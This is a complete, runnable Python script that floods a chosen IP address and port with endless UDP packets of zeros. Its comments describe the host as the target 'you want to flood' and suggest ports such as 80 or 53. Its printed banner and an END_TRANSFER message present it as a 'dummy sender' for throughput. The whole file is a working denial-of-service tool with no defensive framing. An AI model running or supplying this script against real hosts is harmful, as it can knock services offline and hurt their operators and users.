import socket
import time

TARGET_IP = "192.168.0.1" # Change this to the target IP address you want to flood
PORT = 80 # Change this to the target port you want to flood (e.g., 80 for HTTP, 53 for DNS, etc.)

TOTAL_SIZE_GB = 6 * 1024
CHUNK_SIZE = 60000

TOTAL_BYTES = TOTAL_SIZE_GB * 1024 * 1024 * 1024
dummy_chunk = b"0" * CHUNK_SIZE

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
addr = (TARGET_IP, PORT)

cycle = 1

print(f"UDP dummy sender started.")
print(f"Target: {TARGET_IP}:{PORT}")
print(f"Each cycle size: {TOTAL_SIZE_GB} GB")
print(f"Chunk size: {CHUNK_SIZE} bytes\n")

try:
    while True:
        sent_bytes = 0
        start_time = time.time()
        last_print = time.time()

        print(f"\nStarting cycle #{cycle}...")
        print(f"Sending dummy {TOTAL_SIZE_GB} GB data...\n")

        while sent_bytes < TOTAL_BYTES:
            remaining = TOTAL_BYTES - sent_bytes

            if remaining >= CHUNK_SIZE:
                data = dummy_chunk
            else:
                data = b"0" * remaining

            sock.sendto(data, addr)
            sent_bytes += len(data)

            now = time.time()

            if now - last_print >= 1:
                gb_sent = sent_bytes / (1024 ** 3)
                percent = (sent_bytes / TOTAL_BYTES) * 100
                speed_mb = sent_bytes / (1024 ** 2) / (now - start_time)

                print(
                    f"\rCycle #{cycle} | Sent: {gb_sent:.2f} GB / {TOTAL_SIZE_GB} GB "
                    f"({percent:.2f}%) | Speed: {speed_mb:.2f} MB/s",
                    end="",
                    flush=True
                )

                last_print = now

        total_time = time.time() - start_time

        print("\n\nCycle completed.")
        print(f"Cycle #{cycle} sent: {sent_bytes / (1024 ** 3):.2f} GB")
        print(f"Time: {total_time:.2f} seconds")
        print(f"Average speed: {(sent_bytes / (1024 ** 2)) / total_time:.2f} MB/s")

        # Tell receiver one cycle is complete
        sock.sendto(b"END_TRANSFER", addr)

        cycle += 1

        # Small pause before starting again
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\nSender stopped by user.")

finally:
    sock.close()